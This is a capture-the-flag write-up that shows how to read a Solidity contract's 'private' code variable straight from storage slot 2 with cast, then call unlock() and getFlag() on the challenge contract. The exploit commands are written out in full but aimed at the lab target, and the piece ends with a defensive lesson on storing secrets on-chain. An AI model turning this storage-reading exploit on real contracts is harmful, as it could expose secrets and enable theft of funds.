# PassCode

## Challenge Overview

The challenge provides a **smart contract** with a hidden `code` stored in a `private` variable.
The goal is to find the code, call `unlock(code)`, and retrieve the flag.

```solidity
uint256 private code;

function unlock(uint256 input) external returns (bool) {
    if (input == code) {
        unlock_flag = true;
        return true;
    }
    return false;
}

function getFlag() external view returns (string memory) {
    require(unlock_flag, "Challenge not solved yet");
    return secret;
}
```

**The logic:**
1. Find the hidden `code`
2. Call `unlock(code)` → `unlock_flag` becomes `true`
3. Call `getFlag()` → receive the flag

---

## Vulnerability

The developer marked `code` as `private`, assuming it would be secret.

**`private` only prevents other contracts from reading it:**
```solidity
otherContract.code()  // ❌ blocked by private
```

**It does NOT prevent direct storage reads:**
```bash
cast storage CONTRACT_ADDRESS SLOT_NUMBER  # ✅ still works
```

In blockchain, every node must store the full contract state — meaning **all storage slots are publicly readable on-chain**, regardless of Solidity visibility modifiers.

---

## Exploitation

### Step 1 — Setup

```bash
RPC_URL=http://<rpc>
API_URL=http://<api>

PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
```

```
CONTRACT_ADDRESS = 0xab9A67BDA6C35E84B64F48A12c668978A450c7B0
PLAYER_ADDRESS   = 0x12eD6c72037210676f2309ae7911336d62A60473
```

### Step 2 — Read the Private Storage Slot

The `code` variable is stored at **slot 2**. We read it directly from the chain:

```bash
CODE_HEX=$(cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL)
echo $CODE_HEX
# 0x000000000000000000000000000000000000000000000000000000000000014d

CODE=$(cast to-dec $CODE_HEX)
echo $CODE
# 333
```

### Step 3 — Call unlock()

```bash
cast send $CONTRACT_ADDRESS "unlock(uint256)" $CODE \
  --private-key $PRIVATE_KEY \
  --rpc-url $RPC_URL \
  --legacy
```

```
status               1 (success)
transactionHash      0xc1a1f41e73a6becf37958907abde2c8f3778d101efb02218dfef3a9a9edff4cd
```

### Step 4 — Verify and Retrieve the Flag

```bash
cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
# true

cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url $RPC_URL
# "?"
```

🏁 Flag retrieved.

---

## Key Takeaway

> **Never store secrets in smart contract storage.** The `private` keyword is a Solidity access modifier — it does not encrypt or hide data on-chain. All storage is publicly readable.
```
